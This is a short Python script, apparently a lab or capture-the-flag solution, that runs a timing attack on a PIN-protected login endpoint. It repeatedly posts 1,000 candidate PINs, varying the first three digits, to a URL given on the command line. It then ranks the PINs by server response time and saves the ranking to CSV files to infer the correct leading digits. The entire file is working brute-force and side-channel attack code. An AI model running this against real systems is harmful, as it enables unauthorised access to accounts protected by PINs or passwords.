import argparse
import csv
import requests
from datetime import datetime as dt

parser = argparse.ArgumentParser()
parser.add_argument('--url')
args = parser.parse_args()

url = args.url

for x in range(0,5):
  result = {}
  for i in range(0, 1000):
    pin = f"{i:03}000000000"
    r = requests.post(url, data={ 'password': pin })
    result[pin] = r.elapsed
    print(r.text)

  sort_results = sorted(result.items(), key=lambda kv: kv[1], reverse=True)

  with open(f"run-{dt.now().strftime('%Y-%m-%d-%H%M')}.csv", 'w') as file:
    f = csv.writer(file)
    f.writerow(['Pin', 'Elapsed'])

    for row in sort_results:
      f.writerow(row)
